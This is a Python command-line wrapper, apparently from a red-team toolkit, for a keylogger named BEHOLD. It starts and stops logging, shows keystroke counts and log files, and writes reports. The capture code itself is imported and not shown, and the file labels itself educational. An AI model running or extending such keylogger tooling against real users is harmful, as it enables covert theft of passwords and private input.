"""
BEHOLD Keylogger CLI Interface
==============================

Command-line interface for the BEHOLD keylogger with integration
into the Red Team Toolkit architecture.

Usage:
    python keylogger_cli.py --start
    python keylogger_cli.py --stop
    python keylogger_cli.py --status
    python keylogger_cli.py --config
    python keylogger_cli.py --report
"""

import argparse
import sys
import json
from pathlib import Path
from datetime import datetime
import click

# Import the keylogger module
from behold_key_log import (
    KeyloggerConfig, 
    AdvancedKeylogger, 
    SafetyManager
)


class KeyloggerCLI:
    """Command-line interface for the BEHOLD keylogger"""
    
    def __init__(self):
        self.config = None
        self.keylogger = None
        self.status_file = Path("keylogger_status.json")
    
    def load_config(self, config_file: str = None):
        """Load configuration"""
        try:
            # If no config file specified, use default
            if config_file is None:
                self.config = KeyloggerConfig()
            else:
                self.config = KeyloggerConfig(config_file)
            return True
        except Exception as e:
            print(f"❌ Error loading configuration: {e}")
            return False
    
    def save_status(self, status: dict):
        """Save keylogger status to file"""
        try:
            with open(self.status_file, 'w') as f:
                json.dump(status, f, indent=2, default=str)
        except Exception as e:
            print(f"⚠️  Warning: Could not save status: {e}")
    
    def load_status(self) -> dict:
        """Load keylogger status from file"""
        try:
            if self.status_file.exists():
                with open(self.status_file, 'r') as f:
                    return json.load(f)
        except Exception as e:
            print(f"⚠️  Warning: Could not load status: {e}")
        return {}
    
    def start_keylogger(self, args):
        """Start the keylogger"""
        if not self.load_config(args.config_file):
            return False
        
        print("🔍 BEHOLD Keylogger - Starting...")
        print("=" * 50)
        
        # Create keylogger instance
        self.keylogger = AdvancedKeylogger(self.config)
        
        # Start logging
        success = self.keylogger.start()
        
        if success:
            # Save status
            status = {
                'running': True,
                'start_time': datetime.now().isoformat(),
                'config_file': str(self.config.config_file),
                'log_file': str(self.keylogger.logger.log_file)
            }
            self.save_status(status)
            print("✅ Keylogger started successfully")
            return True
        else:
            print("❌ Failed to start keylogger")
            return False
    
    def stop_keylogger(self, args):
        """Stop the keylogger"""
        status = self.load_status()
        
        if not status.get('running', False):
            print("ℹ️  Keylogger is not currently running")
            return True
        
        print("🛑 Stopping keylogger...")
        
        # Load config and create keylogger instance
        if not self.load_config(status.get('config_file')):
            return False
        
        self.keylogger = AdvancedKeylogger(self.config)
        self.keylogger.stop()
        
        # Update status
        status['running'] = False
        status['stop_time'] = datetime.now().isoformat()
        self.save_status(status)
        
        print("✅ Keylogger stopped")
        return True
    
    def show_status(self, args):
        """Show keylogger status"""
        status = self.load_status()
        
        if not status:
            print("ℹ️  No keylogger status found")
            return True
        
        print("📊 KEYLOGGER STATUS")
        print("=" * 30)
        print(f"Running: {'✅ Yes' if status.get('running') else '❌ No'}")
        
        if 'start_time' in status:
            start_time = datetime.fromisoformat(status['start_time'])
            print(f"Start Time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        if 'stop_time' in status:
            stop_time = datetime.fromisoformat(status['stop_time'])
            print(f"Stop Time: {stop_time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        if 'log_file' in status:
            log_file = Path(status['log_file'])
            if log_file.exists():
                size = log_file.stat().st_size
                print(f"Log File: {log_file} ({size} bytes)")
            else:
                print(f"Log File: {log_file} (not found)")
        
        if 'config_file' in status:
            print(f"Config File: {status['config_file']}")
        
        # Show statistics if available
        if self.load_config(status.get('config_file')):
            self.keylogger = AdvancedKeylogger(self.config)
            stats = self.keylogger.get_statistics()
            
            print("\n📈 STATISTICS")
            print("-" * 20)
            print(f"Keys Logged: {stats.get('keys_logged', 0)}")
            print(f"Errors: {stats.get('errors', 0)}")
            print(f"Encryption: {'Enabled' if stats.get('encryption_enabled') else 'Disabled'}")
            
            if stats.get('duration_seconds'):
                duration = stats['duration_seconds']
                print(f"Duration: {duration:.2f} seconds")
        
        return True
    
    def show_config(self, args):
        """Show current configuration"""
        if not self.load_config(args.config_file):
            return False
        
        print("⚙️  KEYLOGGER CONFIGURATION")
        print("=" * 40)
        
        for section in self.config.config.sections():
            print(f"\n[{section.upper()}]")
            print("-" * len(section))
            for key, value in self.config.config.items(section):
                print(f"  {key}: {value}")
        
        return True
    
    def generate_report(self, args):
        """Generate a keylogger report"""
        if not self.load_config(args.config_file):
            return False
        
        status = self.load_status()
        
        print("📋 Generating keylogger report...")
        
        # Create report data
        report = {
            'report_type': 'keylogger',
            'generated_at': datetime.now().isoformat(),
            'status': status,
            'configuration': {}
        }
        
        # Add configuration
        for section in self.config.config.sections():
            report['configuration'][section] = dict(self.config.config.items(section))
        
        # Add statistics if available
        if status.get('running') or 'start_time' in status:
            self.keylogger = AdvancedKeylogger(self.config)
            report['statistics'] = self.keylogger.get_statistics()
        
        # Save report
        report_file = f"keylogger_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(report_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            print(f"✅ Report saved to: {report_file}")
        except Exception as e:
            print(f"❌ Error saving report: {e}")
            return False
        
        return True
    
    def run_tests(self, args):
        """Run keylogger tests"""
        print("🧪 Running keylogger tests...")
        
        try:
            import pytest
            import sys
            from pathlib import Path
            
            # Run the test file
            test_file = Path(__file__).parent / "tests" / "test_behold_key_log.py"
            if test_file.exists():
                result = pytest.main([str(test_file), "-v"])
                return result == 0
            else:
                print(f"❌ Test file not found: {test_file}")
                return False
        except ImportError:
            print("❌ pytest not installed. Install with: pip install pytest")
            return False
        except Exception as e:
            print(f"❌ Error running tests: {e}")
            return False


def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="BEHOLD Keylogger - Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python keylogger_cli.py --start          # Start keylogger
  python keylogger_cli.py --stop           # Stop keylogger
  python keylogger_cli.py --status         # Show status
  python keylogger_cli.py --config         # Show configuration
  python keylogger_cli.py --report         # Generate report
  python keylogger_cli.py --test           # Run tests

SAFETY WARNING:
  This tool is for educational purposes and authorized testing only.
  Unauthorized use may violate laws and privacy rights.
        """
    )
    
    # Add command groups
    commands = parser.add_mutually_exclusive_group(required=True)
    commands.add_argument('--start', action='store_true', help='Start keylogger')
    commands.add_argument('--stop', action='store_true', help='Stop keylogger')
    commands.add_argument('--status', action='store_true', help='Show status')
    commands.add_argument('--config', action='store_true', help='Show configuration')
    commands.add_argument('--report', action='store_true', help='Generate report')
    commands.add_argument('--test', action='store_true', help='Run tests')
    
    # Add optional arguments
    parser.add_argument('--config-file', dest='config_file', 
                       help='Configuration file path')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Create CLI instance
    cli = KeyloggerCLI()
    
    # Execute command
    success = False
    
    try:
        if args.start:
            success = cli.start_keylogger(args)
        elif args.stop:
            success = cli.stop_keylogger(args)
        elif args.status:
            success = cli.show_status(args)
        elif args.config:
            success = cli.show_config(args)
        elif args.report:
            success = cli.generate_report(args)
        elif args.test:
            success = cli.run_tests(args)
    except KeyboardInterrupt:
        print("\n🛑 Interrupted by user")
        success = False
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        success = False
    
    # Exit with appropriate code
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
